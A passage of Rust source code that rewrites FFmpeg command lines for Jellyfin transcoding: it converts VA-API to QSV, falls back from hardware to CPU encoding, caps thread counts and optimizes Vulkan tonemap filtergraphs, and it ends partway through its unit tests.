            "VA-API to QSV adaptation requires h264_vaapi or hevc_vaapi output encoder".to_string(),
        );
    }

    let qsv_dev_name = if vaapi_dev_name == "qs" { "qsv0" } else { "qs" };
    let target_node = render_node
        .or(fallback_vaapi_node.as_deref())
        .unwrap_or("/dev/dri/renderD128");
    let mut emitted_qsv_init = false;
    let mut out = Vec::with_capacity(args.len() + 4);
    let mut i = 0usize;
    let mut after_double_dash = false;

    while i < args.len() {
        let arg = args[i].as_ref();
        if after_double_dash {
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        let next = args.get(i + 1).map(AsRef::as_ref);

        if arg == "-init_hw_device" {
            if let Some(spec) = next {
                let (hw, _) = parse_init_hw_device(spec);
                if hw == Some(HwAccel::Vaapi) {
                    out.push(arg.to_string());
                    out.push(format_vaapi_init_spec(
                        spec,
                        render_node,
                        false,
                        Some(&vaapi_dev_name),
                    ));
                    if !emitted_qsv_init {
                        out.push("-init_hw_device".to_string());
                        out.push(format!("qsv={qsv_dev_name}@{vaapi_dev_name}"));
                        emitted_qsv_init = true;
                    }
                } else {
                    out.push(arg.to_string());
                    out.push(spec.to_string());
                }
                i += 2;
                continue;
            }
        } else if arg == "-vaapi_device" {
            if next.is_some() {
                if !emitted_qsv_init {
                    out.push("-init_hw_device".to_string());
                    out.push(format!("vaapi={vaapi_dev_name}:{target_node}"));
                    out.push("-init_hw_device".to_string());
                    out.push(format!("qsv={qsv_dev_name}@{vaapi_dev_name}"));
                    if !has_filter_hw_device {
                        out.push("-filter_hw_device".to_string());
                        out.push(qsv_dev_name.to_string());
                    }
                    emitted_qsv_init = true;
                }
                i += 2;
                continue;
            }
        } else if arg == "-filter_hw_device" {
            if let Some(val) = next {
                out.push(arg.to_string());
                if val == vaapi_dev_name
                    || val.eq_ignore_ascii_case("va")
                    || val.eq_ignore_ascii_case("vaapi")
                {
                    out.push(qsv_dev_name.to_string());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_hwaccel_flag(arg) || is_hwaccel_output_format_flag(arg) {
            if let Some(val) = next {
                out.push(arg.to_string());
                if val.eq_ignore_ascii_case("vaapi") {
                    out.push("qsv".to_string());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_hwaccel_device_flag(arg) {
            if let Some(val) = next {
                out.push(arg.to_string());
                if val == vaapi_dev_name || is_valid_render_node_path(val) {
                    out.push(qsv_dev_name.to_string());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_video_codec_flag(arg) {
            if let Some(val) = next {
                let is_output = last_input_idx.is_none_or(|pos| i > pos + 1);
                if is_output {
                    if let Some(qsv_enc) = vaapi_to_qsv_encoder(val) {
                        out.push(arg.to_string());
                        out.push(qsv_enc.to_string());
                    } else {
                        out.push(arg.to_string());
                        out.push(val.to_string());
                    }
                } else if let Some(qsv_dec) = base_decoder_to_qsv(val) {
                    out.push(arg.to_string());
                    out.push(qsv_dec.to_string());
                } else {
                    out.push(arg.to_string());
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if arg == "-rc_mode" {
            if next.is_some() {
                i += 2;
                continue;
            }
        } else if arg == "-qp" || arg.starts_with("-qp:") {
            if let Some(val) = next {
                let rewritten_flag = if let Some(suffix) = arg.strip_prefix("-qp") {
                    format!("-global_quality{suffix}")
                } else {
                    "-global_quality".to_string()
                };
                out.push(rewritten_flag);
                out.push(val.to_string());
                i += 2;
                continue;
            }
        } else if is_video_filter_flag(arg) {
            if let Some(val) = next {
                let translated = translate_filtergraph_vaapi_to_qsv(val)?;
                out.push(arg.to_string());
                out.push(translated);
                i += 2;
                continue;
            }
        } else if option_takes_value(arg) {
            out.push(arg.to_string());
            if let Some(val) = next {
                out.push(val.to_string());
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        out.push(arg.to_string());
        i += 1;
    }

    if !emitted_qsv_init {
        let mut prefixed = Vec::with_capacity(out.len() + 4);
        prefixed.push("-init_hw_device".to_string());
        prefixed.push(format!("vaapi={vaapi_dev_name}:{target_node}"));
        prefixed.push("-init_hw_device".to_string());
        prefixed.push(format!("qsv={qsv_dev_name}@{vaapi_dev_name}"));
        prefixed.extend(out);
        return Ok(prefixed);
    }

    Ok(out)
}

fn adapt_hw_to_cpu<S: AsRef<str>>(args: &[S]) -> Result<Vec<String>, String> {
    let (_, last_input_idx) = find_first_and_last_input_idx(args);

    let mut has_preset = false;
    let mut saw_supported_encoder = false;

    {
        let mut i = 0usize;
        while i < args.len() {
            let arg = args[i].as_ref();
            if arg == "--" {
                break;
            }
            let next = args.get(i + 1).map(AsRef::as_ref);
            if arg == "-preset" || arg.starts_with("-preset:") {
                if next.is_some() {
                    has_preset = true;
                    i += 2;
                    continue;
                }
            } else if is_video_codec_flag(arg) {
                if let Some(val) = next {
                    let is_output = last_input_idx.is_none_or(|pos| i > pos + 1);
                    if is_output && !val.eq_ignore_ascii_case("copy") {
                        if hw_to_cpu_encoder(val).is_some() {
                            saw_supported_encoder = true;
                        } else {
                            return Err(format!(
                                "cannot adapt non-H.264/HEVC encoder '{val}' to CPU"
                            ));
                        }
                    }
                    i += 2;
                    continue;
                }
            } else if option_takes_value(arg) {
                i += 2;
                continue;
            }
            i += 1;
        }
    }

    if !saw_supported_encoder {
        return Err("HW to CPU adaptation requires an H.264 or HEVC output encoder".to_string());
    }

    let mut out = Vec::with_capacity(args.len() + 2);
    let mut inserted_preset = has_preset;
    let mut i = 0usize;
    let mut after_double_dash = false;

    while i < args.len() {
        let arg = args[i].as_ref();
        if after_double_dash {
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        let next = args.get(i + 1).map(AsRef::as_ref);

        if is_cpu_stripped_hw_flag(arg) {
            if next.is_some() {
                i += 2;
                continue;
            }
        } else if arg == "-preset" || arg.starts_with("-preset:") {
            if let Some(val) = next {
                out.push(arg.to_string());
                if is_valid_x264_preset(val) {
                    out.push(val.to_string());
                } else {
                    out.push("veryfast".to_string());
                }
                i += 2;
                continue;
            }
        } else if arg == "-pix_fmt" || arg.starts_with("-pix_fmt:") {
            if let Some(val) = next {
                out.push(arg.to_string());
                if parse_hwaccel_name(val).is_some() {
                    out.push("yuv420p".to_string());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_video_codec_flag(arg) {
            if let Some(val) = next {
                let is_output = last_input_idx.is_none_or(|pos| i > pos + 1);
                if is_output {
                    if let Some(cpu_enc) = hw_to_cpu_encoder(val) {
                        out.push(arg.to_string());
                        out.push(cpu_enc.to_string());
                        if !inserted_preset {
                            out.push("-preset".to_string());
                            out.push("veryfast".to_string());
                            inserted_preset = true;
                        }
                    } else {
                        out.push(arg.to_string());
                        out.push(val.to_string());
                    }
                } else {
                    let lower = val.trim().to_ascii_lowercase();
                    if lower.ends_with("_qsv") || lower.ends_with("_cuvid") {
                        let base = hw_decoder_to_base_codec(&lower).ok_or_else(|| {
                            format!("unsupported hardware decoder '{val}' for CPU adaptation")
                        })?;
                        out.push(arg.to_string());
                        out.push(base.to_string());
                    } else {
                        out.push(arg.to_string());
                        out.push(val.to_string());
                    }
                }
                i += 2;
                continue;
            }
        } else if is_video_filter_flag(arg) {
            if let Some(val) = next {
                let translated = translate_filtergraph_hw_to_cpu(val)?;
                if !translated.is_empty() {
                    out.push(arg.to_string());
                    out.push(translated);
                }
                i += 2;
                continue;
            }
        } else if option_takes_value(arg) {
            out.push(arg.to_string());
            if let Some(val) = next {
                out.push(val.to_string());
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        out.push(arg.to_string());
        i += 1;
    }

    Ok(out)
}

fn is_thread_cap_flag(flag: &str) -> bool {
    flag == "-threads"
        || flag.starts_with("-threads:")
        || flag == "-filter_threads"
        || flag == "-filter_complex_threads"
}

fn is_threads_option_flag(flag: &str) -> bool {
    flag == "-threads" || flag.starts_with("-threads:")
}

fn is_video_or_global_threads_flag(flag: &str) -> bool {
    flag == "-threads" || flag == "-threads:v" || flag.starts_with("-threads:v:")
}

fn clamp_thread_value(val: &str, max_threads: usize) -> String {
    let trimmed = val.trim();
    if trimmed == "0" || trimmed.eq_ignore_ascii_case("auto") {
        return max_threads.to_string();
    }
    if let Ok(n) = trimmed.parse::<usize>() {
        if n == 0 || n > max_threads {
            return max_threads.to_string();
        }
    }
    val.to_string()
}

/// Applies a worker-local FFmpeg thread cap (`>= 1`) to `-threads`, `-filter_threads`, and
/// `-filter_complex_threads`, clamping `"0"` or values exceeding `max_threads` while preserving
/// smaller explicit positive values, injecting `-threads <max_threads>` for input and output
/// sections when omitted for video/global streams, and injecting `-filter_complex_threads`
/// whenever `-filter_complex` or `-lavfi` is used without an explicit cap.
pub fn apply_ffmpeg_thread_cap<S: AsRef<str>>(args: &[S], max_threads: usize) -> Vec<String> {
    let cap = max_threads.max(1);
    let cap_str = cap.to_string();

    let (first_input_idx, last_input_idx) = find_first_and_last_input_idx(args);
    let mut has_input_threads = false;
    let mut has_output_threads = false;
    let mut has_filter_complex_threads = false;
    let mut first_filter_complex_idx: Option<usize> = None;
    let mut output_vcodec_insert_after: Option<usize> = None;
    let mut final_output_insert_before: Option<usize> = None;

    {
        let mut i = 0usize;
        let mut after_double_dash = false;
        let mut double_dash_idx: Option<usize> = None;
        while i < args.len() {
            let arg = args[i].as_ref();
            if after_double_dash {
                if last_input_idx.is_some() {
                    final_output_insert_before = double_dash_idx.or(Some(i));
                }
                i += 1;
                continue;
            }
            if arg == "--" {
                after_double_dash = true;
                double_dash_idx = Some(i);
                i += 1;
                continue;
            }

            if arg == "-filter_complex_threads" && args.get(i + 1).is_some() {
                has_filter_complex_threads = true;
                i += 2;
                continue;
            }

            if (arg == "-filter_complex" || arg == "-lavfi") && args.get(i + 1).is_some() {
                if first_filter_complex_idx.is_none() {
                    first_filter_complex_idx = Some(i);
                }
                i += 2;
                continue;
            }

            if is_threads_option_flag(arg) && args.get(i + 1).is_some() {
                if is_video_or_global_threads_flag(arg) {
                    if first_input_idx.is_some_and(|fi| i < fi) {
                        has_input_threads = true;
                    } else if last_input_idx.is_some_and(|li| i > li + 1) {
                        has_output_threads = true;
                    }
                }
                i += 2;
                continue;
            }

            if is_video_codec_flag(arg) && args.get(i + 1).is_some() {
                if last_input_idx.is_some_and(|li| i > li + 1)
                    && output_vcodec_insert_after.is_none()
                {
                    output_vcodec_insert_after = Some(i + 1);
                }
                i += 2;
                continue;
            }

            if option_takes_value(arg) {
                i += 2;
                continue;
            }

            if last_input_idx.is_some_and(|li| i > li + 1) && (!arg.starts_with('-') || arg == "-")
            {
                final_output_insert_before = Some(i);
            }

            i += 1;
        }
    }

    let need_input_insert = first_input_idx.filter(|_| !has_input_threads);
    let need_filter_complex_threads_before =
        first_filter_complex_idx.filter(|_| !has_filter_complex_threads);
    let need_output_insert_after_vcodec = if last_input_idx.is_some()
        && final_output_insert_before.is_some()
        && !has_output_threads
    {
        output_vcodec_insert_after
    } else {
        None
    };
    let need_output_insert_before_pos = if last_input_idx.is_some()
        && !has_output_threads
        && need_output_insert_after_vcodec.is_none()
    {
        final_output_insert_before
    } else {
        None
    };

    let mut out = Vec::with_capacity(args.len() + 6);
    let mut i = 0usize;
    let mut after_double_dash = false;

    while i < args.len() {
        if need_input_insert == Some(i) {
            out.push("-threads".to_string());
            out.push(cap_str.clone());
        }
        if need_filter_complex_threads_before == Some(i) {
            out.push("-filter_complex_threads".to_string());
            out.push(cap_str.clone());
        }
        if need_output_insert_before_pos == Some(i) {
            out.push("-threads".to_string());
            out.push(cap_str.clone());
        }

        let arg = args[i].as_ref();
        if after_double_dash {
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            out.push(arg.to_string());
            i += 1;
            continue;
        }

        if is_thread_cap_flag(arg) {
            out.push(arg.to_string());
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(clamp_thread_value(val, cap));
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        if option_takes_value(arg) {
            out.push(arg.to_string());
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(val.to_string());
                if need_output_insert_after_vcodec == Some(i + 1) {
                    out.push("-threads".to_string());
                    out.push(cap_str.clone());
                }
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        out.push(arg.to_string());
        i += 1;
    }

    out
}

fn is_positive_integer_dim(raw: &str) -> bool {
    raw.trim().parse::<u32>().is_ok_and(|n| n > 0)
}

fn is_valid_pre_scale_dims(w: &str, h: &str) -> bool {
    let w = w.trim();
    let h = h.trim();
    (is_positive_integer_dim(w) && is_positive_integer_dim(h))
        || (w == "-2" && is_positive_integer_dim(h))
        || (is_positive_integer_dim(w) && h == "-2")
}

fn is_forbidden_post_placebo_filter(name_lower: &str) -> bool {
    matches!(
        name_lower,
        "subtitles" | "ass" | "overlay" | "crop" | "pad" | "transpose" | "rotate" | "deinterlace"
    ) || name_lower.starts_with("overlay_")
        || name_lower.starts_with("deinterlace_")
        || name_lower.starts_with("transpose_")
}

fn hwmap_derives_vulkan_forward(args: &str) -> bool {
    let mut derives_vulkan = false;
    let mut is_reverse = false;
    for part in split_filter_args(args) {
        if let Some((k, v)) = part.split_once('=') {
            let key = k.trim();
            let val = v.trim();
            if key.eq_ignore_ascii_case("derive_device") && val.eq_ignore_ascii_case("vulkan") {
                derives_vulkan = true;
            } else if key.eq_ignore_ascii_case("reverse") && matches!(val, "1" | "true") {
                is_reverse = true;
            }
        }
    }
    derives_vulkan && !is_reverse
}

fn is_pre_hwmap_software_pixel_filter(name_lower: &str) -> bool {
    matches!(
        name_lower,
        "subtitles"
            | "ass"
            | "overlay"
            | "yadif"
            | "bwdif"
            | "scale"
            | "zscale"
            | "crop"
            | "pad"
            | "transpose"
            | "rotate"
            | "tonemap"
            | "lut3d"
            | "drawtext"
    )
}

fn format_args_includes_vaapi(args: Option<&str>) -> bool {
    let Some(a) = args else {
        return false;
    };
    for (idx, part) in split_filter_args(a).into_iter().enumerate() {
        let trimmed = part.trim();
        let pix_list = if let Some(rest) = trimmed.strip_prefix("pix_fmts=") {
            rest
        } else if idx == 0 && !trimmed.contains('=') {
            trimmed
        } else {
            continue;
        };
        if pix_list
            .split('|')
            .any(|tok| tok.trim().eq_ignore_ascii_case("vaapi"))
        {
            return true;
        }
    }
    false
}

fn hwupload_targets_vaapi(args: Option<&str>, filter_hw_device_is_vaapi: bool) -> bool {
    if let Some(a) = args {
        for part in split_filter_args(a) {
            if let Some((k, v)) = part.trim().split_once('=') {
                if k.trim().eq_ignore_ascii_case("derive_device") {
                    return v.trim().eq_ignore_ascii_case("vaapi");
                }
            }
        }
    }
    filter_hw_device_is_vaapi
}

fn is_ffmpeg_falsy(val: &str) -> bool {
    matches!(
        val.trim().to_ascii_lowercase().as_str(),
        "0" | "false" | "no" | "off"
    )
}

fn optimize_vulkan_tonemap_filtergraph_with_input_state(
    graph: &str,
    input_is_vaapi_frames: bool,
    filter_hw_device_is_vaapi: bool,
) -> Option<String> {
    let chains = split_unquoted(graph, b';');
    if chains.len() != 1 {
        return None;
    }

    let raw_nodes = split_unquoted(chains[0], b',');
    let nodes: Vec<DetailedFilterNode<'_>> = raw_nodes
        .iter()
        .filter_map(|raw| parse_detailed_filter_node(raw))
        .collect();
    if nodes.len() < 2 {
        return None;
    }

    let hwmap_idx = nodes.iter().position(|n| {
        n.name.eq_ignore_ascii_case("hwmap") && n.args.is_some_and(hwmap_derives_vulkan_forward)
    })?;
    let placebo_idx = hwmap_idx + 1;
    let placebo = nodes.get(placebo_idx)?;
    if !placebo.name.eq_ignore_ascii_case("libplacebo") {
        return None;
    }

    // Verify frames entering `hwmap=derive_device=vulkan` are guaranteed to be `AV_PIX_FMT_VAAPI`.
    let mut current_is_vaapi = input_is_vaapi_frames;
    for node in &nodes[..hwmap_idx] {
        let lower = node.name.to_ascii_lowercase();
        if lower == "scale_vaapi" || lower == "hwmap" || lower == "hwupload_cuda" {
            return None;
        }
        if lower == "hwdownload" {
            current_is_vaapi = false;
        } else if lower == "hwupload" {
            if hwupload_targets_vaapi(node.args, filter_hw_device_is_vaapi) {
                current_is_vaapi = true;
            } else {
                return None;
            }
        } else if lower == "format" {
            if !format_args_includes_vaapi(node.args) {
                current_is_vaapi = false;
            }
        } else if is_pre_hwmap_software_pixel_filter(&lower) {
            current_is_vaapi = false;
        } else if let Some(hw) = hwaccel_from_filter_name(&lower) {
            if hw != HwAccel::Vaapi {
                return None;
            }
        }
    }
    if !current_is_vaapi {
        return None;
    }

    // Bail if any subtitle, overlay, crop, pad, transpose, rotate, or deinterlace filter appears after libplacebo.
    if nodes[placebo_idx + 1..]
        .iter()
        .any(|n| is_forbidden_post_placebo_filter(&n.name.to_ascii_lowercase()))
    {
        return None;
    }

    let placebo_args = placebo.args?;
    let mut has_tonemapping = false;
    let mut placebo_w: Option<&str> = None;
    let mut placebo_h: Option<&str> = None;

    for part in split_filter_args(placebo_args) {
        let Some((k, v)) = part.trim().split_once('=') else {
            continue;
        };
        let key = k.trim().to_ascii_lowercase();
        let val = v.trim();
        match key.as_str() {
            "tonemapping" if !val.is_empty() => has_tonemapping = true,
            "crop_x" | "crop_y" | "crop_w" | "crop_h" | "pos_x" | "pos_y" | "pos_w" | "pos_h"
            | "pad_crop_ratio" => return None,
            "fit_mode" => {
                if !matches!(val.to_ascii_lowercase().as_str(), "fill" | "0") {
                    return None;
                }
            }
            "normalize_sar" | "reset_sar" => {
                if !is_ffmpeg_falsy(val) {
                    return None;
                }
            }
            "force_original_aspect_ratio" => {
                if !matches!(val.to_ascii_lowercase().as_str(), "disable" | "0") {
                    return None;
                }
            }
            "force_divisible_by" => {
                if val != "1" {
                    return None;
                }
            }
            "w" => placebo_w = Some(val),
            "h" => placebo_h = Some(val),
            _ => {}
        }
    }

    if !has_tonemapping {
        return None;
    }

    // Pattern A: libplacebo itself specifies safe w/h dimensions.
    if let (Some(w), Some(h)) = (placebo_w, placebo_h) {
        if !is_valid_pre_scale_dims(w, h) {
            return None;
        }
        let mut out = Vec::with_capacity(nodes.len() + 1);
        for (idx, node) in nodes.iter().enumerate() {
            if idx == hwmap_idx {
                out.push(format!(
                    "{}scale_vaapi=w={w}:h={h}:format=p010",
                    node.leading_pads
                ));
                out.push(format_filter_node(
                    "",
                    node.name,
                    node.instance,
                    node.args,
                    node.trailing_pads,
                ));
            } else {
                out.push(node.raw.to_string());
            }
        }
        return Some(out.join(","));
    }

    // Pattern B: libplacebo has no w/h and is immediately followed by scale_vulkan=w=W:h=H[:format=F...].
    if placebo_w.is_some() || placebo_h.is_some() {
        return None;
    }
    let scale_vk_idx = placebo_idx + 1;
    let scale_vk = nodes.get(scale_vk_idx)?;
    if !scale_vk.name.eq_ignore_ascii_case("scale_vulkan") {
        return None;
    }
    let scale_vk_args = scale_vk.args?;
    let mut vk_w: Option<&str> = None;
    let mut vk_h: Option<&str> = None;
    let mut vk_format: Option<&str> = None;
    let mut extra_kept: Vec<String> = Vec::new();

    for (idx, part) in split_filter_args(scale_vk_args).into_iter().enumerate() {
        let trimmed = part.trim();
        if trimmed.is_empty() {
            continue;
        }
        if let Some((k, v)) = trimmed.split_once('=') {
            let key = k.trim().to_ascii_lowercase();
            let val = v.trim();
            match key.as_str() {
                "w" | "width" => vk_w = Some(val),
                "h" | "height" => vk_h = Some(val),
                "format" => vk_format = Some(val),
                "scaler" => {}
                "debayer" => return None,
                "out_range" | "extra_hw_frames" => extra_kept.push(format!("{key}={val}")),
                _ => return None,
            }
        } else if idx == 0 {
            vk_w = Some(trimmed);
        } else if idx == 1 {
            vk_h = Some(trimmed);
        } else {
            return None;
        }
    }

    let (w, h) = (vk_w?, vk_h?);
    if !is_valid_pre_scale_dims(w, h) {
        return None;
    }

    let mut simplified_vk_args = Vec::new();
    if let Some(fmt) = vk_format {
        simplified_vk_args.push(format!("format={fmt}"));
    }
    simplified_vk_args.extend(extra_kept);

    let mut out = Vec::with_capacity(nodes.len() + 1);
    for (idx, node) in nodes.iter().enumerate() {
        if idx == hwmap_idx {
            out.push(format!(
                "{}scale_vaapi=w={w}:h={h}:format=p010",
                node.leading_pads
            ));
            out.push(format_filter_node(
                "",
                node.name,
                node.instance,
                node.args,
                node.trailing_pads,
            ));
        } else if idx == scale_vk_idx {
            if !simplified_vk_args.is_empty() {
                let joined = simplified_vk_args.join(":");
                out.push(format_filter_node(
                    node.leading_pads,
                    "scale_vulkan",
                    node.instance,
                    Some(&joined),
                    node.trailing_pads,
                ));
            } else if !node.trailing_pads.is_empty() {
                if let Some(prev) = out.last_mut() {
                    prev.push_str(node.trailing_pads);
                }
            }
        } else {
            out.push(node.raw.to_string());
        }
    }

    Some(out.join(","))
}

/// Optimizes linear VA-API -> Vulkan `libplacebo` HDR tonemap filtergraphs by pre-scaling
/// on fixed-function `scale_vaapi` (preserving 10-bit `p010` precision) BEFORE deriving Vulkan
/// frames for `libplacebo`.
///
/// Returns `None` whenever the graph is multi-branch (`;`), already pre-scales with `scale_vaapi`,
/// downloads frames or runs software pixel filters before `hwmap` without a subsequent VA-API
/// `hwupload`, performs post-tonemap geometry/subtitle/deinterlace operations, or does not match a
/// verified safe downscale pattern.
pub fn optimize_vulkan_tonemap_filtergraph(graph: &str) -> Option<String> {
    optimize_vulkan_tonemap_filtergraph_with_input_state(graph, true, true)
}

fn is_linear_video_filter_flag(flag: &str) -> bool {
    flag == "-vf" || flag == "-filter:v" || flag.starts_with("-filter:v:")
}

#[derive(Debug, Clone, Copy)]
struct VaapiVulkanCommandState {
    input_is_vaapi_frames: bool,
    filter_hw_device_is_vaapi: bool,
}

fn analyze_vaapi_vulkan_command<S: AsRef<str>>(args: &[S]) -> Option<VaapiVulkanCommandState> {
    let cap = required_capability(args);
    if !(cap.required_hwaccels.contains(&HwAccel::Vaapi)
        && cap.required_hwaccels.contains(&HwAccel::Vulkan))
    {
        return None;
    }
    if cap.required_hwaccels.contains(&HwAccel::Qsv)
        || cap.required_hwaccels.contains(&HwAccel::Cuda)
    {
        return None;
    }

    let mut has_vaapi_init = false;
    let mut has_vaapi_device_flag = false;
    let mut vaapi_device_names: Vec<String> = Vec::new();
    let mut non_vaapi_device_names: Vec<String> = Vec::new();
    let mut last_init_hw_type: Option<HwAccel> = None;
    let mut filter_hw_device: Option<String> = None;

    let mut cur_input_hwaccel_vaapi = false;
    let mut cur_input_hwaccel_out_vaapi = false;
    let mut primary_input_is_vaapi = false;
    let mut input_count = 0usize;

    let mut i = 0usize;
    while i < args.len() {
        let arg = args[i].as_ref();
        if arg == "--" {
            break;
        }
        let next = args.get(i + 1).map(AsRef::as_ref);
        if arg == "-vaapi_device" {
            has_vaapi_device_flag = true;
            last_init_hw_type = Some(HwAccel::Vaapi);
            i += 2;
            continue;
        } else if arg == "-init_hw_device" {
            if let Some(spec) = next {
                let (hw_opt, _) = parse_init_hw_device(spec);
                last_init_hw_type = hw_opt;
                match hw_opt {
                    Some(HwAccel::Vaapi) => {
                        has_vaapi_init = true;
                        if let Some(name) = parse_init_hw_device_name(spec) {
                            push_unique(&mut vaapi_device_names, name.to_string());
                        }
                    }
                    Some(_) => {
                        if let Some(name) = parse_init_hw_device_name(spec) {
                            push_unique(&mut non_vaapi_device_names, name.to_string());
                        }
                    }
                    None => {}
                }
                i += 2;
                continue;
            }
        } else if arg == "-filter_hw_device" {
            if let Some(val) = next {
                filter_hw_device = Some(val.to_string());
                i += 2;
                continue;
            }
        } else if is_hwaccel_flag(arg) {
            if let Some(val) = next {
                cur_input_hwaccel_vaapi = parse_hwaccel_name(val) == Some(HwAccel::Vaapi);
                i += 2;
                continue;
            }
        } else if is_hwaccel_output_format_flag(arg) {
            if let Some(val) = next {
                cur_input_hwaccel_out_vaapi = parse_hwaccel_name(val) == Some(HwAccel::Vaapi);
                i += 2;
                continue;
            }
        } else if arg == "-i" {
            if input_count == 0 {
                primary_input_is_vaapi = cur_input_hwaccel_vaapi && cur_input_hwaccel_out_vaapi;
            }
            input_count += 1;
            cur_input_hwaccel_vaapi = false;
            cur_input_hwaccel_out_vaapi = false;
            i += 2;
            continue;
        } else if option_takes_value(arg) {
            i += 2;
            continue;
        }
        i += 1;
    }

    if input_count == 0 {
        primary_input_is_vaapi = cur_input_hwaccel_vaapi && cur_input_hwaccel_out_vaapi;
    }

    if !(has_vaapi_init || has_vaapi_device_flag || primary_input_is_vaapi) {
        return None;
    }

    let filter_hw_device_is_vaapi = match filter_hw_device.as_deref() {
        Some(dev) => {
            if non_vaapi_device_names.iter().any(|n| n == dev) {
                false
            } else if vaapi_device_names.iter().any(|n| n == dev) {
                true
            } else {
                (has_vaapi_init || has_vaapi_device_flag) && dev.eq_ignore_ascii_case("vaapi")
            }
        }
        None => last_init_hw_type == Some(HwAccel::Vaapi),
    };

    Some(VaapiVulkanCommandState {
        input_is_vaapi_frames: primary_input_is_vaapi,
        filter_hw_device_is_vaapi,
    })
}

/// Applies [`optimize_vulkan_tonemap_filtergraph`] to `-vf` / `-filter:v` / `-filter:v:*` values
/// when the `ffmpeg` command proves `AV_PIX_FMT_VAAPI` frames enter `hwmap=derive_device=vulkan`
/// (without QSV/CUDA frames).
pub fn optimize_vulkan_tonemap_args<S: AsRef<str>>(args: &[S]) -> Vec<String> {
    let Some(state) = analyze_vaapi_vulkan_command(args) else {
        return args.iter().map(|s| s.as_ref().to_string()).collect();
    };

    let mut out = Vec::with_capacity(args.len());
    let mut i = 0usize;
    let mut after_double_dash = false;

    while i < args.len() {
        let arg = args[i].as_ref();
        out.push(arg.to_string());
        if after_double_dash {
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            i += 1;
            continue;
        }

        if is_linear_video_filter_flag(arg) {
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                match optimize_vulkan_tonemap_filtergraph_with_input_state(
                    val,
                    state.input_is_vaapi_frames,
                    state.filter_hw_device_is_vaapi,
                ) {
                    Some(opt) => out.push(opt),
                    None => out.push(val.to_string()),
                }
                i += 2;
                continue;
            }
        } else if option_takes_value(arg) {
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(val.to_string());
                i += 2;
                continue;
            }
        }

        i += 1;
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn vec_s(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| (*s).to_string()).collect()
    }

    #[test]
    fn table_driven_probe_detection() {
        let cases: &[(&str, &[&str], bool)] = &[
            ("empty args", &[], true),
            ("version", &["-version"], true),
            ("hide_banner encoders", &["-hide_banner", "-encoders"], true),
            ("decoders", &["-decoders"], true),
            ("hwaccels", &["-hwaccels"], true),
            ("filters", &["-filters"], true),
            ("help topic", &["-h", "encoder=h264_vaapi"], true),
            ("buildconf", &["-buildconf"], true),
            ("init_hw_device list", &["-init_hw_device", "list"], true),
            ("no input", &["-f", "null", "-"], true),
            (
                "version even with input",
                &["-i", "/media/a.mkv", "-version"],
                true,
            ),
            (
                "real transcode with lavfi synthetic input (parity test)",
                &[
                    "-f",
                    "lavfi",
                    "-i",
                    "testsrc2=size=640x360:rate=24",
                    "-t",
                    "2",
                    "-c:v",
                    "h264_vaapi",
                    "/var/cache/jellyfin/transcodes/parity.mp4",
                ],
                false,
            ),
            (
                "metadata value looks like probe flag",
                &[
                    "-i",
                    "/srv/media/movie.mkv",
                    "-metadata",
                    "title=-version",
                    "-c:v",
                    "libx264",
                    "out.m3u8",
                ],
                false,
            ),
            (
                "input path starts with dash-h",
                &["-i", "-h", "-c:v", "libx264", "out.m3u8"],
                false,
            ),
        ];

        for (name, args, expected) in cases {
            assert_eq!(is_probe(args), *expected, "case '{name}'");
        }
    }

    #[test]
    fn parses_unicode_in_bracketed_filter_arguments() {
        let filter = "subtitles=f=/srv/media/[日本語]ep1.ass[out]";
        assert_eq!(
            parse_filter_node(filter),
            Some(("subtitles", Some("f=/srv/media/[日本語]ep1.ass")))
        );
        let cap = required_capability(&["-vf", filter, "-c:v", "libx264"]);
        assert!(cap.is_software_only());
    }

    #[test]
    fn trailing_stream_copy_does_not_clobber_video_encoder() {
        let cap = required_capability(&[
            "-hwaccel",
            "vaapi",
            "-i",
            "/srv/media/movie.mkv",
            "-c:v:0",
            "h264_vaapi",
            "-c:v:1",
            "copy",
            "out.m3u8",
        ]);
        assert_eq!(cap.required_encoder(), Some("h264_vaapi"));
        assert_eq!(cap.hwaccel, Some(HwAccel::Vaapi));
    }

    #[test]
    fn table_driven_real_jellyfin_capabilities() {
        // 1. Intel/AMD VA-API HLS transcode
        let vaapi_args = vec_s(&[
            "-analyzeduration", "200M", "-probesize", "1G",
            "-init_hw_device", "vaapi=va:/dev/dri/renderD128,driver=iHD",
            "-filter_hw_device", "va",
            "-hwaccel", "vaapi",
            "-hwaccel_output_format", "vaapi",
            "-i", "file:/srv/media/movies/4k.mkv",
            "-vf", "setparams=color_primaries=bt709:color_trc=bt709:colorspace=bt709,scale_vaapi=w=1920:h=1080:format=nv12:extra_hw_frames=24",
            "-codec:v:0", "h264_vaapi",
            "-codec:a:0", "aac",
            "/var/cache/jellyfin/transcodes/seg.m3u8",
        ]);
        let vaapi_cap = required_capability(&vaapi_args);
        assert_eq!(vaapi_cap.hwaccel, Some(HwAccel::Vaapi));
        assert_eq!(vaapi_cap.required_hwaccels, vec![HwAccel::Vaapi]);
        assert_eq!(vaapi_cap.encoder.as_deref(), Some("h264_vaapi"));
        assert_eq!(vaapi_cap.filters, vec!["scale_vaapi"]);
